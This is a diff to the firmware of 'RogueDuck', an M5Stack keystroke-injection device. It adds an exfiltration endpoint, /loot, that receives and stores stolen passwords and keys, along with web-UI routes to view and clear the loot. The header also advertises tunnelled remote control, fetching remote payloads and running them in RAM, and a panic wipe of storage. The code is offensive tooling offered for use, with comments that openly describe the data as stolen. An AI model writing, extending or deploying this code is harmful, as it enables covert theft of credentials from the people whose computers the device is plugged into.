@@ -7,17 +7,22 @@
  *  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝
  *
  *  =============================================================================
- *  PROJECT   : M5Stack Stick S3 - RogueDuck V2 HID Injector (Cyberpunk CRT Edition)
+ *  PROJECT   : M5Stack Stick S3 - RogueDuck V2.1 HID Injector (Cyberpunk CRT Edition)
  *  AUTHOR    : @M5RogueOps
  *  COMMUNITY : https://www.ethicalhackersden.org
  *  =============================================================================
  *  
  *  FEATURES:
- *  - Upload .txt DuckyScript payloads via Wi-Fi AP web UI (file or paste)
- *  - List, Fire/Execute Remotly & delete stored payloads from the web UI
- *  - Select payload with BtnB, execute with BtnA on device
- *  - Parses Classic DuckyScript 1.0 (US English layout)
- *  - Custom hardware-level CRT scanline UI
+ *  - Dual-Mode Wi-Fi: AP + STA operation with Captive Portal DNS redirection.
+ *  - Global Access: Tunneling support for Ngrok/Cloudflared for remote control.
+ *  - Mobile-First Web UI: Dark-mode, responsive controls for on-the-go deployment.
+ *  - Payload Management: OTA upload, live browser editor, file listing & deletion.
+ *  - Cloud Vector: Fetch and execute remote payloads directly into RAM.
+ *  - Tactical Data Exfiltration: POST loot (passwords/keys) to /loot for viewing.
+ *  - Cyberpunk CRT UI: Hardware-level scanline aesthetic with glitch injection effects.
+ *  - Panic Wipe: Dedicated killswitch to securely format LittleFS storage.
+ *  - Physical Control: Payload selection (BtnB) and execution (BtnA) with Pocket Lock.
+ *  - Real-time Telemetry: Live battery monitoring and dynamic IP rendering.
  *
  */
 
@@ -39,7 +44,7 @@
 
 // --- Configuration ---
 const char* AP_SSID = "RogueDuck_Sync";
-const char* AP_PASS = "12345678"; // Must be at least 8 chars
+const char* AP_PASS = "12345678"; // Must be at least 8 chars - You could change this (optional)
 // Add these for Station (STA) Mode
 const char* STA_SSID = "ADD_YOUR_SSID_HERE"; // add your ssid
 const char* STA_PASS = "ADD_YOUR_SSID_PASSWORD"; // add your wifi networks password
@@ -186,6 +191,16 @@ String buildIndexHtml() {
         "</form></div>"
         "</div>" // Closes the Stored Payloads container
 
+        "<div class=\"container\">"
+        "<h2>Exfiltrated Data</h2>"
+        "<form action=\"/viewloot\" method=\"GET\">"
+        "<button class=\"btn\" style=\"background:#555; width:100%;\" type=\"submit\">VIEW LOOT.TXT</button>"
+        "</form>"
+        "<div style=\"margin-top:10px;\">"
+        "<form method=\"POST\" action=\"/clearloot\" onsubmit=\"return confirm('Wipe all looted data?');\">"
+        "<button class=\"del\" style=\"background:#333; color:#aaa; border:1px solid #555; padding:10px; width:100%;\" type=\"submit\">[ CLEAR LOOT ]</button>"
+        "</form></div></div>"
+
         // --- DEVELOPMENT CREDITS (REQUIRED TO REMAIN INTACT) ---
         "<div class=\"footer\">"
         "ROGUEDUCK V2 BY <a href=\"https://github.com/M5RogueOps\" target=\"_blank\">@M5ROGUEOPS</a><br><br>"
@@ -327,7 +342,45 @@ void drawUI() {
 void handleRoot() {
     server.send(200, "text/html", buildIndexHtml());
 }
+void handleViewLoot() {
+    if (!LittleFS.exists("/loot.txt")) {
+        server.send(404, "text/plain", "Loot file is empty or does not exist.");
+        return;
+    }
 
+    File f = LittleFS.open("/loot.txt", "r");
+    server.streamFile(f, "text/plain");
+    f.close();
+}
+void handleClearLoot() {
+    if (LittleFS.exists("/loot.txt")) {
+        LittleFS.remove("/loot.txt");
+        server.send(200, "text/html", "<h2>Loot wiped.</h2><br><a href='/'>Go Back</a>");
+    } else {
+        server.send(404, "text/html", "<h2>No loot file found.</h2><br><a href='/'>Go Back</a>");
+    }
+}
+void handleLoot() {
+    // Check if the request contains data
+    if (!server.hasArg("plain")) {
+        server.send(400, "text/plain", "No loot detected.");
+        return;
+    }
+
+    // Open (or create) loot.txt in append mode
+    File f = LittleFS.open("/loot.txt", "a");
+    if (!f) {
+        server.send(500, "text/plain", "Failed to open loot file.");
+        return;
+    }
+
+    // Write the received data + a newline
+    f.println(server.arg("plain"));
+    f.close();
+
+    Serial.println("Loot received and saved to loot.txt");
+    server.send(200, "text/plain", "Loot secured.");
+}
 void handleUpload() {
     HTTPUpload& upload = server.upload();
     if (upload.status == UPLOAD_FILE_START) {
@@ -816,6 +869,9 @@ void setup() {
     server.on("/read", HTTP_GET, handleRead); // <--- lets us edit the files
     server.on("/wipe", HTTP_POST, handleWipe); // <--- function to remotly wipe device
     server.on("/cloud", HTTP_POST, handleCloudDrop); // <--- Ads function to get payloads from raw text files hosted online
+    server.on("/loot", HTTP_POST, handleLoot); // <--- this helps with Exfiltration 
+    server.on("/clearloot", HTTP_POST, handleClearLoot); // <--- This helps us delete the stolen exfiltraion data
+    server.on("/viewloot", HTTP_GET, handleViewLoot); //<--- helps view the stolen data from exfiltraion data from loot.txt
     
     // --- NEW: CATCH-ALL ROUTE ---
     // If the phone asks for captive.apple.com, this triggers the redirect
